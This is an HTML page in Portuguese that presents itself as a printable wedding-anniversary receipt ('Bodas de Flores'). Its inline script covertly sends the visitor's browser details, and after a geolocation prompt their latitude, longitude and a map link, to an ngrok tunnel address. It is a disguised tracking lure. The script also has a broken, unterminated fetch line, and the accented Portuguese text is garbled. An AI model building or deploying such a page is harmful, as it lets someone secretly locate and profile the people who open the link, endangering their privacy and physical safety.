<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bodas de Flores</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body>
  <div class="comprovante-container">
    <h1>Bodas de Flores</h1>

    <div class="informacoes">
      <p><span>Data:</span> <span id="data-atual"></span></p>
      <p><span>De:</span> Faun e Amber</p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

  </div>

  <script>
  // Fun√ß√£o para coletar info do navegador
  function getBrowserInfo() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: {
        width: window.screen.width,
        height: window.screen.height
      }
    };
  }

  // Envia mensagem de acesso ao servidor com infos extras
  const browserInfo = getBrowserInfo();

  const message = `O site foi acessado.\n
üñ• Plataforma: ${browserInfo.platform}
üåê Navegador: ${browserInfo.userAgent}
üåé Idioma: ${browserInfo.language}
üìè Resolu√ß√£o: ${browserInfo.screen.width}x${browserInfo.screen.height}`;

  fetch("
      fetch("https://853f-2804-d59-8c25-2f00-1c4d-a13f-874c-6127.ngrok-free.app/send-message", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ message })
  });

  window.addEventListener("load", () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    } else {
      alert("Algo deu errado. Tente novamente mais tarde.");
    }
  });

    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, '0');
    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
    const ano = dataAtual.getFullYear();

    const dataFormatada = `${dia}/${mes}/${ano}`;

    document.getElementById("data-atual").textContent = dataFormatada;

    console.log(dataAtual)

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://853f-2804-d59-8c25-2f00-1c4d-a13f-874c-6127.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            alert("Erro ao enviar o comprovante.");
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      alert("Erro ao obter a localiza√ß√£o: " + error.message);
    }
  </script>
</body>

</html>
